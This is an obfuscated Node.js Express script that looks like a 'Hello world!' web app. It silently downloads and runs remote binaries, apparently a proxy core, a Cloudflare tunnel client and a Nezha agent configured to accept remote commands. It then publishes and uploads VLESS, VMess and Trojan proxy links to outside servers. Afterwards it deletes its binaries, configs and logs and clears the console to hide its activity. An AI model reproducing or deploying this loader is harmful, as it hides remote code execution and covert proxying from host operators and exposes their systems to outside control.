const _0x2385ba=_0x3ec3;(function(_0x5a3918,_0x2e7864){const _0x1b1187=_0x3ec3,_0x5dd4a4=_0x5a3918();while(!![]){try{const _0x5e8570=parseInt(_0x1b1187(0x13b))/0x1+-parseInt(_0x1b1187(0x150))/0x2+-parseInt(_0x1b1187(0x176))/0x3+-parseInt(_0x1b1187(0x1b3))/0x4+-parseInt(_0x1b1187(0x130))/0x5+-parseInt(_0x1b1187(0x11b))/0x6+parseInt(_0x1b1187(0x132))/0x7;if(_0x5e8570===_0x2e7864)break;else _0x5dd4a4['push'](_0x5dd4a4['shift']());}catch(_0x2db512){_0x5dd4a4['push'](_0x5dd4a4['shift']());}}}(_0x2dff,0x9ee1e));const express=require(_0x2385ba(0x19a)),app=express(),axios=require(_0x2385ba(0x15c)),os=require('os'),fs=require('fs'),path=require(_0x2385ba(0x100)),{promisify}=require('util'),exec=promisify(require(_0x2385ba(0x157))[_0x2385ba(0x144)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2385ba(0x137)][_0x2385ba(0x133)]||'',PROJECT_URL=process[_0x2385ba(0x137)][_0x2385ba(0x195)]||'',AUTO_ACCESS=process[_0x2385ba(0x137)][_0x2385ba(0x131)]||![],FILE_PATH=process[_0x2385ba(0x137)]['FILE_PATH']||_0x2385ba(0x16a),SUB_PATH=process[_0x2385ba(0x137)][_0x2385ba(0x161)]||_0x2385ba(0x110),PORT=process[_0x2385ba(0x137)][_0x2385ba(0x18b)]||process[_0x2385ba(0x137)][_0x2385ba(0x111)]||0xbb8,UUID=process[_0x2385ba(0x137)]['UUID']||_0x2385ba(0x189),NEZHA_SERVER=process[_0x2385ba(0x137)][_0x2385ba(0x10e)]||'',NEZHA_PORT=process[_0x2385ba(0x137)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2385ba(0x137)][_0x2385ba(0x13f)]||'',ARGO_DOMAIN=process[_0x2385ba(0x137)][_0x2385ba(0x1af)]||_0x2385ba(0x193),ARGO_AUTH=process[_0x2385ba(0x137)][_0x2385ba(0x1ac)]||_0x2385ba(0x19d),ARGO_PORT=process[_0x2385ba(0x137)][_0x2385ba(0x129)]||0x1f41,CFIP=process[_0x2385ba(0x137)][_0x2385ba(0x17b)]||_0x2385ba(0x105),CFPORT=process[_0x2385ba(0x137)]['CFPORT']||0x1bb,NAME=process[_0x2385ba(0x137)][_0x2385ba(0x14e)]||_0x2385ba(0x17e);!fs['existsSync'](FILE_PATH)?(fs[_0x2385ba(0x14c)](FILE_PATH),console[_0x2385ba(0x134)](FILE_PATH+_0x2385ba(0x13c))):console[_0x2385ba(0x134)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2201cb=_0x2385ba,_0x4b2b98=_0x2201cb(0x13a);let _0x468a9d='';for(let _0x2b94ca=0x0;_0x2b94ca<0x6;_0x2b94ca++){_0x468a9d+=_0x4b2b98['charAt'](Math[_0x2201cb(0x1a1)](Math[_0x2201cb(0x1ae)]()*_0x4b2b98[_0x2201cb(0x19f)]));}return _0x468a9d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2385ba(0x166)](FILE_PATH,npmName),phpPath=path[_0x2385ba(0x166)](FILE_PATH,phpName),webPath=path[_0x2385ba(0x166)](FILE_PATH,webName),botPath=path[_0x2385ba(0x166)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2385ba(0x113)),listPath=path[_0x2385ba(0x166)](FILE_PATH,'list.txt'),bootLogPath=path[_0x2385ba(0x166)](FILE_PATH,_0x2385ba(0x183)),configPath=path[_0x2385ba(0x166)](FILE_PATH,_0x2385ba(0x107));function deleteNodes(){const _0x50c0a8=_0x2385ba;try{if(!UPLOAD_URL)return;if(!fs[_0x50c0a8(0x1ab)](subPath))return;let _0x21d520;try{_0x21d520=fs[_0x50c0a8(0x1b4)](subPath,_0x50c0a8(0x114));}catch{return null;}const _0x53cfa9=Buffer['from'](_0x21d520,'base64')['toString'](_0x50c0a8(0x114)),_0x23e8f1=_0x53cfa9[_0x50c0a8(0x12b)]('\x0a')[_0x50c0a8(0x153)](_0x43b56c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x50c0a8(0x149)](_0x43b56c));if(_0x23e8f1[_0x50c0a8(0x19f)]===0x0)return;return axios[_0x50c0a8(0x177)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x23e8f1}),{'headers':{'Content-Type':_0x50c0a8(0x10d)}})['catch'](_0x1d1968=>{return null;}),null;}catch(_0x1784a8){return null;}}function cleanupOldFiles(){const _0x1e15d8=_0x2385ba;try{const _0x101be1=fs[_0x1e15d8(0x104)](FILE_PATH);_0x101be1['forEach'](_0x4d4e41=>{const _0x5598b1=_0x1e15d8,_0xbe03b3=path[_0x5598b1(0x166)](FILE_PATH,_0x4d4e41);try{const _0x2abd2c=fs['statSync'](_0xbe03b3);_0x2abd2c['isFile']()&&fs[_0x5598b1(0x1ba)](_0xbe03b3);}catch(_0x407c1a){}});}catch(_0x38f762){}}app[_0x2385ba(0x139)]('/',function(_0x5c2680,_0x1ed632){const _0x5421d5=_0x2385ba;_0x1ed632[_0x5421d5(0x140)](_0x5421d5(0x148));});async function generateConfig(){const _0x15ca46=_0x2385ba,_0x1b7fd2={'log':{'access':_0x15ca46(0x136),'error':_0x15ca46(0x136),'loglevel':_0x15ca46(0x199)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x15ca46(0x11a)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x15ca46(0x11f),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x15ca46(0x15d),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x15ca46(0x19b),'protocol':_0x15ca46(0x10b),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x15ca46(0x115),'security':_0x15ca46(0x199)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x15ca46(0x10b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x15ca46(0x199),'wsSettings':{'path':_0x15ca46(0x11f)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x15ca46(0x179),_0x15ca46(0x1b5)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x15ca46(0x179),_0x15ca46(0x1b5)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x15ca46(0x19b),'protocol':_0x15ca46(0x13e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x15ca46(0x179),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x15ca46(0x160)]},'outbounds':[{'protocol':_0x15ca46(0x17c),'tag':'direct'},{'protocol':_0x15ca46(0x196),'tag':'block'}]};fs[_0x15ca46(0x103)](path[_0x15ca46(0x166)](FILE_PATH,'config.json'),JSON['stringify'](_0x1b7fd2,null,0x2));}function getSystemArchitecture(){const _0x5de166=_0x2385ba,_0x203ee1=os[_0x5de166(0x184)]();return _0x203ee1===_0x5de166(0x171)||_0x203ee1==='arm64'||_0x203ee1===_0x5de166(0x126)?'arm':'amd';}function _0x3ec3(_0x52610c,_0x299b6d){_0x52610c=_0x52610c-0xfd;const _0x2dff6a=_0x2dff();let _0x3ec3e3=_0x2dff6a[_0x52610c];return _0x3ec3e3;}function downloadFile(_0x39334f,_0x42f944,_0x4e0698){const _0x3aae78=_0x2385ba,_0x331433=_0x39334f;!fs[_0x3aae78(0x1ab)](FILE_PATH)&&fs[_0x3aae78(0x14c)](FILE_PATH,{'recursive':!![]});const _0xbc7114=fs[_0x3aae78(0x102)](_0x331433);axios({'method':_0x3aae78(0x139),'url':_0x42f944,'responseType':_0x3aae78(0x1ad)})[_0x3aae78(0x12e)](_0x228398=>{const _0x1953de=_0x3aae78;_0x228398[_0x1953de(0x18f)][_0x1953de(0x101)](_0xbc7114),_0xbc7114['on'](_0x1953de(0x127),()=>{const _0x13541a=_0x1953de;_0xbc7114[_0x13541a(0x15b)](),console[_0x13541a(0x134)](_0x13541a(0x1b1)+path[_0x13541a(0x175)](_0x331433)+_0x13541a(0x16c)),_0x4e0698(null,_0x331433);}),_0xbc7114['on']('error',_0x13872e=>{const _0xdcd38d=_0x1953de;fs[_0xdcd38d(0x182)](_0x331433,()=>{});const _0x94d7db=_0xdcd38d(0x1b1)+path[_0xdcd38d(0x175)](_0x331433)+_0xdcd38d(0x1a6)+_0x13872e[_0xdcd38d(0x117)];console['error'](_0x94d7db),_0x4e0698(_0x94d7db);});})['catch'](_0x271cbe=>{const _0xcde45d=_0x3aae78,_0x198c0e=_0xcde45d(0x1b1)+path[_0xcde45d(0x175)](_0x331433)+_0xcde45d(0x1a6)+_0x271cbe['message'];console['error'](_0x198c0e),_0x4e0698(_0x198c0e);});}async function downloadFilesAndRun(){const _0x11bd72=_0x2385ba,_0x3d4d99=getSystemArchitecture(),_0x4c930d=getFilesForArchitecture(_0x3d4d99);if(_0x4c930d[_0x11bd72(0x19f)]===0x0){console[_0x11bd72(0x134)](_0x11bd72(0x152));return;}const _0x5aa484=_0x4c930d[_0x11bd72(0x185)](_0x5e4e65=>{return new Promise((_0x2e98f8,_0x9bc674)=>{const _0x4aa0b5=_0x3ec3;downloadFile(_0x5e4e65[_0x4aa0b5(0x165)],_0x5e4e65[_0x4aa0b5(0x169)],(_0x41a9f2,_0x2457c5)=>{_0x41a9f2?_0x9bc674(_0x41a9f2):_0x2e98f8(_0x2457c5);});});});try{await Promise[_0x11bd72(0x135)](_0x5aa484);}catch(_0x1608d5){console[_0x11bd72(0x106)]('Error\x20downloading\x20files:',_0x1608d5);return;}function _0x8ace48(_0x1acf35){const _0x5e60d4=_0x11bd72,_0x21a919=0x1fd;_0x1acf35[_0x5e60d4(0x192)](_0x2dff4e=>{const _0x3a4022=_0x5e60d4;fs[_0x3a4022(0x1ab)](_0x2dff4e)&&fs[_0x3a4022(0x159)](_0x2dff4e,_0x21a919,_0x55afdd=>{const _0x25b73b=_0x3a4022;_0x55afdd?console[_0x25b73b(0x106)](_0x25b73b(0x155)+_0x2dff4e+':\x20'+_0x55afdd):console[_0x25b73b(0x134)]('Empowerment\x20success\x20for\x20'+_0x2dff4e+':\x20'+_0x21a919['toString'](0x8));});});}const _0x18048c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x8ace48(_0x18048c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17f160=NEZHA_SERVER[_0x11bd72(0x119)](':')?NEZHA_SERVER[_0x11bd72(0x12b)](':')[_0x11bd72(0x163)]():'',_0x5181cb=new Set([_0x11bd72(0x1a8),_0x11bd72(0x18d),_0x11bd72(0xfd),'2087','2083',_0x11bd72(0x14f)]),_0x1e0a12=_0x5181cb[_0x11bd72(0x187)](_0x17f160)?_0x11bd72(0x180):_0x11bd72(0x19c),_0x169324=_0x11bd72(0x109)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x11bd72(0x191)+_0x1e0a12+_0x11bd72(0x167)+UUID;fs[_0x11bd72(0x103)](path['join'](FILE_PATH,_0x11bd72(0x1a3)),_0x169324);const _0x2cf439=_0x11bd72(0x145)+phpPath+_0x11bd72(0x141)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2cf439),console[_0x11bd72(0x134)](phpName+_0x11bd72(0x173)),await new Promise(_0x3b14a3=>setTimeout(_0x3b14a3,0x3e8));}catch(_0x3a0b2c){console[_0x11bd72(0x106)]('php\x20running\x20error:\x20'+_0x3a0b2c);}}else{let _0xe9be2c='';const _0x1900a4=['443',_0x11bd72(0x18d),_0x11bd72(0xfd),_0x11bd72(0x154),_0x11bd72(0x168),_0x11bd72(0x14f)];_0x1900a4['includes'](NEZHA_PORT)&&(_0xe9be2c=_0x11bd72(0x124));const _0x285c1f=_0x11bd72(0x145)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x11bd72(0x162)+NEZHA_KEY+'\x20'+_0xe9be2c+_0x11bd72(0x14b);try{await exec(_0x285c1f),console[_0x11bd72(0x134)](npmName+_0x11bd72(0x173)),await new Promise(_0x49dedb=>setTimeout(_0x49dedb,0x3e8));}catch(_0x2c5731){console[_0x11bd72(0x106)]('npm\x20running\x20error:\x20'+_0x2c5731);}}}else console[_0x11bd72(0x134)](_0x11bd72(0xfe));const _0x2dd4fe=_0x11bd72(0x145)+webPath+_0x11bd72(0x14d)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2dd4fe),console[_0x11bd72(0x134)](webName+'\x20is\x20running'),await new Promise(_0x155037=>setTimeout(_0x155037,0x3e8));}catch(_0x1c8517){console['error'](_0x11bd72(0x188)+_0x1c8517);}if(fs[_0x11bd72(0x1ab)](botPath)){let _0x540769;if(ARGO_AUTH[_0x11bd72(0x18a)](/^[A-Z0-9a-z=]{120,250}$/))_0x540769='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x11bd72(0x18a)](/TunnelSecret/)?_0x540769=_0x11bd72(0x143)+FILE_PATH+_0x11bd72(0x11e):_0x540769=_0x11bd72(0x18c)+FILE_PATH+_0x11bd72(0x12f)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x540769+_0x11bd72(0x1b0)),console['log'](botName+_0x11bd72(0x173)),await new Promise(_0xcff336=>setTimeout(_0xcff336,0x7d0));}catch(_0x23671b){console['error'](_0x11bd72(0x112)+_0x23671b);}}await new Promise(_0x742021=>setTimeout(_0x742021,0x1388));}function getFilesForArchitecture(_0x147d8a){const _0x25d93b=_0x2385ba;let _0x148e11;_0x147d8a===_0x25d93b(0x171)?_0x148e11=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x25d93b(0x12a)}]:_0x148e11=[{'fileName':webPath,'fileUrl':_0x25d93b(0x118)},{'fileName':botPath,'fileUrl':_0x25d93b(0x125)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x237d23=_0x147d8a==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x25d93b(0x1a0);_0x148e11[_0x25d93b(0x123)]({'fileName':npmPath,'fileUrl':_0x237d23});}else{const _0x5f593c=_0x147d8a===_0x25d93b(0x171)?_0x25d93b(0x128):'https://amd64.ssss.nyc.mn/v1';_0x148e11[_0x25d93b(0x123)]({'fileName':phpPath,'fileUrl':_0x5f593c});}}return _0x148e11;}function argoType(){const _0x121d7a=_0x2385ba;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x121d7a(0x1a5));return;}if(ARGO_AUTH[_0x121d7a(0x119)](_0x121d7a(0x1b8))){fs[_0x121d7a(0x103)](path[_0x121d7a(0x166)](FILE_PATH,_0x121d7a(0x16f)),ARGO_AUTH);const _0x3f0ab9=_0x121d7a(0x1b2)+ARGO_AUTH[_0x121d7a(0x12b)]('\x22')[0xb]+_0x121d7a(0x10a)+path[_0x121d7a(0x166)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x121d7a(0x11c)+ARGO_PORT+_0x121d7a(0x164);fs[_0x121d7a(0x103)](path['join'](FILE_PATH,_0x121d7a(0x16d)),_0x3f0ab9);}else console['log'](_0x121d7a(0x158));}argoType();async function extractDomains(){const _0x1aea79=_0x2385ba;let _0xad64fb;if(ARGO_AUTH&&ARGO_DOMAIN)_0xad64fb=ARGO_DOMAIN,console[_0x1aea79(0x134)](_0x1aea79(0x1a2),_0xad64fb),await _0x594b6e(_0xad64fb);else try{const _0x40ad0a=fs[_0x1aea79(0x1b4)](path[_0x1aea79(0x166)](FILE_PATH,_0x1aea79(0x183)),'utf-8'),_0x2e2d1d=_0x40ad0a['split']('\x0a'),_0x1bba54=[];_0x2e2d1d[_0x1aea79(0x192)](_0x4a8d45=>{const _0x3db0be=_0x1aea79,_0x37c9be=_0x4a8d45['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x37c9be){const _0x2f34d4=_0x37c9be[0x1];_0x1bba54[_0x3db0be(0x190)](_0x2f34d4);}});if(_0x1bba54[_0x1aea79(0x19f)]>0x0)_0xad64fb=_0x1bba54[0x0],console[_0x1aea79(0x134)](_0x1aea79(0x15e),_0xad64fb),await _0x594b6e(_0xad64fb);else{console[_0x1aea79(0x134)](_0x1aea79(0x11d)),fs[_0x1aea79(0x1ba)](path[_0x1aea79(0x166)](FILE_PATH,_0x1aea79(0x183)));async function _0x574a4a(){const _0x22f569=_0x1aea79;try{process[_0x22f569(0x122)]===_0x22f569(0x10c)?await exec(_0x22f569(0x1a7)+botName+_0x22f569(0x181)):await exec(_0x22f569(0x1aa)+botName[_0x22f569(0x170)](0x0)+']'+botName[_0x22f569(0x14a)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x479136){}}_0x574a4a(),await new Promise(_0x5aaccd=>setTimeout(_0x5aaccd,0xbb8));const _0x1ea5ff='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1aea79(0x145)+botPath+'\x20'+_0x1ea5ff+_0x1aea79(0x1b0)),console[_0x1aea79(0x134)](botName+_0x1aea79(0x173)),await new Promise(_0x1e6104=>setTimeout(_0x1e6104,0xbb8)),await extractDomains();}catch(_0x59abe5){console[_0x1aea79(0x106)](_0x1aea79(0x112)+_0x59abe5);}}}catch(_0xbaa065){console[_0x1aea79(0x106)](_0x1aea79(0x16e),_0xbaa065);}async function _0x594b6e(_0x50937b){const _0x5bbef5=_0x1aea79,_0x5efda0=execSync(_0x5bbef5(0x1b7),{'encoding':_0x5bbef5(0x114)}),_0x4e1e74=_0x5efda0[_0x5bbef5(0x186)](),_0xdbe688=NAME?NAME+'-'+_0x4e1e74:_0x4e1e74;return new Promise(_0x2d9067=>{setTimeout(()=>{const _0x1c5bec=_0x3ec3,_0x451a39={'v':'2','ps':''+_0xdbe688,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1c5bec(0x199),'net':'ws','type':_0x1c5bec(0x199),'host':_0x50937b,'path':_0x1c5bec(0x194),'tls':_0x1c5bec(0x179),'sni':_0x50937b,'alpn':'','fp':'firefox'},_0x3b3d97='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1c5bec(0x120)+_0x50937b+_0x1c5bec(0x198)+_0x50937b+_0x1c5bec(0x16b)+_0xdbe688+_0x1c5bec(0x15f)+Buffer['from'](JSON[_0x1c5bec(0x17a)](_0x451a39))[_0x1c5bec(0x151)](_0x1c5bec(0x1a9))+_0x1c5bec(0x197)+UUID+'@'+CFIP+':'+CFPORT+_0x1c5bec(0x17d)+_0x50937b+_0x1c5bec(0x198)+_0x50937b+_0x1c5bec(0x1a4)+_0xdbe688+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x1c5bec(0x12c)](_0x3b3d97)[_0x1c5bec(0x151)](_0x1c5bec(0x1a9))),fs[_0x1c5bec(0x103)](subPath,Buffer[_0x1c5bec(0x12c)](_0x3b3d97)[_0x1c5bec(0x151)](_0x1c5bec(0x1a9))),console[_0x1c5bec(0x134)](FILE_PATH+_0x1c5bec(0x172)),uploadNodes(),app[_0x1c5bec(0x139)]('/'+SUB_PATH,(_0x1aec41,_0xbffce4)=>{const _0xb1d916=_0x1c5bec,_0x437f24=Buffer[_0xb1d916(0x12c)](_0x3b3d97)[_0xb1d916(0x151)]('base64');_0xbffce4[_0xb1d916(0x10f)]('Content-Type',_0xb1d916(0x116)),_0xbffce4[_0xb1d916(0x140)](_0x437f24);}),_0x2d9067(_0x3b3d97);},0x7d0);});}}async function uploadNodes(){const _0x54884f=_0x2385ba;if(UPLOAD_URL&&PROJECT_URL){const _0x11a3b3=PROJECT_URL+'/'+SUB_PATH,_0x4f0fa3={'subscription':[_0x11a3b3]};try{const _0x48cf92=await axios[_0x54884f(0x177)](UPLOAD_URL+'/api/add-subscriptions',_0x4f0fa3,{'headers':{'Content-Type':'application/json'}});return _0x48cf92&&_0x48cf92[_0x54884f(0x147)]===0xc8?(console[_0x54884f(0x134)](_0x54884f(0x121)),_0x48cf92):null;}catch(_0x2adcbd){if(_0x2adcbd['response']){if(_0x2adcbd[_0x54884f(0x178)][_0x54884f(0x147)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x54884f(0x1ab)](listPath))return;const _0x5ec387=fs['readFileSync'](listPath,'utf-8'),_0x1a5f7e=_0x5ec387[_0x54884f(0x12b)]('\x0a')['filter'](_0x15fade=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x15fade));if(_0x1a5f7e[_0x54884f(0x19f)]===0x0)return;const _0x486053=JSON[_0x54884f(0x17a)]({'nodes':_0x1a5f7e});try{const _0x26a985=await axios[_0x54884f(0x177)](UPLOAD_URL+'/api/add-nodes',_0x486053,{'headers':{'Content-Type':_0x54884f(0x10d)}});return _0x26a985&&_0x26a985[_0x54884f(0x147)]===0xc8?(console[_0x54884f(0x134)](_0x54884f(0x146)),_0x26a985):null;}catch(_0x448fa8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4d124a=_0x3ec3,_0x13cfc2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x13cfc2[_0x4d124a(0x190)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x13cfc2[_0x4d124a(0x190)](phpPath);process[_0x4d124a(0x122)]===_0x4d124a(0x10c)?exec(_0x4d124a(0x1b6)+_0x13cfc2[_0x4d124a(0x166)]('\x20')+_0x4d124a(0x174),_0x470a8e=>{const _0x452014=_0x4d124a;console[_0x452014(0x15a)](),console[_0x452014(0x134)](_0x452014(0x18e)),console[_0x452014(0x134)](_0x452014(0x12d));}):exec(_0x4d124a(0xff)+_0x13cfc2['join']('\x20')+_0x4d124a(0x13d),_0x4c315e=>{const _0x55d755=_0x4d124a;console['clear'](),console[_0x55d755(0x134)]('App\x20is\x20running'),console[_0x55d755(0x134)](_0x55d755(0x12d));});},0x15f90);}function _0x2dff(){const _0x6629ae=['\x0a\x20\x20credentials-file:\x20','vless','win32','application/json','NEZHA_SERVER','set','sub','PORT','Error\x20executing\x20command:\x20','sub.txt','utf-8','tcp','text/plain;\x20charset=utf-8','message','https://amd64.ssss.nyc.mn/web','includes','xtls-rprx-vision','3523416duAkzX','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/tunnel.yml\x20run','/vless-argo','?encryption=none&security=tls&sni=','Subscription\x20uploaded\x20successfully','platform','unshift','--tls','https://amd64.ssss.nyc.mn/bot','aarch64','finish','https://arm64.ssss.nyc.mn/v1','ARGO_PORT','https://arm64.ssss.nyc.mn/bot','split','from','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','then','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','4283060XkaLwD','AUTO_ACCESS','26813724MhmBLz','UPLOAD_URL','log','all','/dev/null','env','listen','get','abcdefghijklmnopqrstuvwxyz','23026BFjCdX','\x20is\x20created','\x20>/dev/null\x202>&1','trojan','NEZHA_KEY','send','\x20-c\x20\x22','automatic\x20access\x20task\x20added\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','exec','nohup\x20','Nodes\x20uploaded\x20successfully','status','Hello\x20world!','test','substring','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','mkdirSync','\x20-c\x20','NAME','2053','162914eiPPUm','toString','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','filter','2087','Empowerment\x20failed\x20for\x20','Skipping\x20adding\x20automatic\x20access\x20task','child_process','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','chmod','clear','close','axios','/trojan-argo','ArgoDomain:','\x0a\x20\x20\x0avmess://','https+local://8.8.8.8/dns-query','SUB_PATH','\x20-p\x20','pop','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','fileName','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2083','fileUrl','./tmp','&path=%2Fvless-argo%3Fed%3D2560#','\x20successfully','tunnel.yml','Error\x20reading\x20boot.log:','tunnel.json','charAt','arm','/sub.txt\x20saved\x20successfully','\x20is\x20running','\x20>\x20nul\x202>&1','basename','3100305zbvkCK','post','response','tls','stringify','CFIP','freedom','?security=tls&sni=','jiahe','https://oooo.serv00.net/add-url','true','.exe\x20>\x20nul\x202>&1','unlink','boot.log','arch','map','trim','has','web\x20running\x20error:\x20','d880fa63-e6b7-4f7b-a1d3-f4226c54a16c','match','SERVER_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','8443','App\x20is\x20running','data','push','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','forEach','albertisme.zjhisme.de5.net','/vmess-argo?ed=2560','PROJECT_URL','blackhole','\x0a\x20\x20\x0atrojan://','&fp=firefox&type=ws&host=','none','express','127.0.0.1','false','eyJhIjoiZWUwNzFlNDYwYmY1MjViZjRiMzk5NGFjYTk4ODhlZDIiLCJ0IjoiMDRhOTJjMzgtYzcyMC00OTVlLThiN2YtODdhNDNmMjA0ZGM2IiwicyI6Ik5XWTBNbVZtT1RrdE5tUXhOaTAwWlRoaUxXRTROVGt0Tm1VNE56UmxOV05qWTJWbCJ9','Unhandled\x20error\x20in\x20startserver:','length','https://amd64.ssss.nyc.mn/agent','floor','ARGO_DOMAIN:','config.yaml','&path=%2Ftrojan-argo%3Fed%3D2560#','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20failed:\x20','taskkill\x20/f\x20/im\x20','443','base64','pkill\x20-f\x20\x22[','existsSync','ARGO_AUTH','stream','random','ARGO_DOMAIN','\x20>/dev/null\x202>&1\x20&','Download\x20','\x0a\x20\x20tunnel:\x20','2576144uGsXsT','readFileSync','quic','del\x20/f\x20/q\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','TunnelSecret','http\x20server\x20is\x20running\x20on\x20port:','unlinkSync','2096','NEZHA\x20variable\x20is\x20empty,skip\x20running','rm\x20-rf\x20','path','pipe','createWriteStream','writeFileSync','readdirSync','cdns.doon.eu.org','error','config.json','Error\x20in\x20startserver:','\x0aclient_secret:\x20'];_0x2dff=function(){return _0x6629ae;};return _0x2dff();}cleanFiles();async function AddVisitTask(){const _0x553457=_0x2385ba;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x553457(0x134)](_0x553457(0x156));return;}try{const _0x229041=await axios[_0x553457(0x177)](_0x553457(0x17f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x553457(0x10d)}});return console[_0x553457(0x134)](_0x553457(0x142)),_0x229041;}catch(_0x26faac){return console[_0x553457(0x106)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x26faac['message']),null;}}async function startserver(){const _0x42afd7=_0x2385ba;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xfaf0f4){console[_0x42afd7(0x106)](_0x42afd7(0x108),_0xfaf0f4);}}startserver()['catch'](_0x3f9c1a=>{const _0x1db6d4=_0x2385ba;console[_0x1db6d4(0x106)](_0x1db6d4(0x19e),_0x3f9c1a);}),app[_0x2385ba(0x138)](PORT,()=>console[_0x2385ba(0x134)](_0x2385ba(0x1b9)+PORT+'!'));
